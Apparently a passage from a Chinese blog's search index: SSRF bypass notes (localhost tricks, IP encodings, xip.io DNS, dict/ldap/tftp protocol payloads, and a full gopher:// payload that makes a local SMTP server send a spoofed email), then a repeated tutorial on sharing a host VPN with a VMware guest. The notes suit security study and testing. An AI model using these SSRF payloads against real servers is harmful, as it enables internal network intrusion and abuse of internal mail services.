ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#11利用特殊地址"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#12利用协议"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#13使用组合"},{"categories":["linux"],"content":"VMware虚拟机共享主机VPN连接方法原理 很久之前就想了解一下，正好有位师傅提起过了这个事，顺势摸索一下吧，文章部分图片取于网络， 与文章主题相关的内容主要摘取于kevinkangkang的知乎笔记 ","date":"2023-11-17","objectID":"/vmware_vpn/:0:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#"},{"categories":["linux"],"content":"\r首先来了解一下vm虚拟机的几种网络连接模式","date":"2023-11-17","objectID":"/vmware_vpn/:1:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#首先来了解一下vm虚拟机的几种网络连接模式"},{"categories":["linux"],"content":"\r1.NAT模式NAT（Network Address Translation）网络地址转换，允许一个整体机构以一个公用IP地址出现在Internet上，即把内部私有网络地址翻译成合法网络IP地址的技术。家用路由器一般都是NAT模式。 让虚拟系统借助NAT（网络地址转换）功能，通过宿主机器所在的网络来访问公网，实现在虚拟系统里访问互联网。如果想利用VMWare安装一个新的虚拟系统，在虚拟系统中不用进行任何手工配置就能直接访问互联网，建议采用NAT模式。 ","date":"2023-11-17","objectID":"/vmware_vpn/:1:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#1nat模式"},{"categories":["linux"],"content":"\r2.桥接模式桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。这样，我们可以手工配置它的TCP/IP信息，以实现通过局域网的网关或路由器访问互联网。桥接更加适合于虚拟机对外提供服务，因为它是可以被外部访问到的，和一个正常的局域网用户没有什么区别。 ","date":"2023-11-17","objectID":"/vmware_vpn/:1:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#2桥接模式"},{"categories":["linux"],"content":"\r3.主机模式某些特殊的网络调试环境中，要求将真实环境和虚拟环境隔离开，这时可以采用主机模式，所有的虚拟系统可以相互通信，但虚拟系统和真实网络是隔离开的；虚拟系统的TCP/IP配置信息都是由虚拟网络中的DHCP服务器动态分配；虚拟系统和真实网络可以相互通信，相当于两台机器通过双绞线互连；虚拟网络是一个全封闭的网络，唯一能够访问的就是主机，不同于NAT的地方就是主机模式没有NAT服务，故虚拟网络不能连接到Internet。 ","date":"2023-11-17","objectID":"/vmware_vpn/:1:3","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#3主机模式"},{"categories":["linux"],"content":"\r接下来切入正题","date":"2023-11-17","objectID":"/vmware_vpn/:2:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#接下来切入正题"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#方法一"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#原理"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#配置方法"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#主机windows配置"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#虚拟机linux配置"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#方法二通过将vpn作为虚拟机网关"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#原理-1"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#配置方法-1"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#vmware配置"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 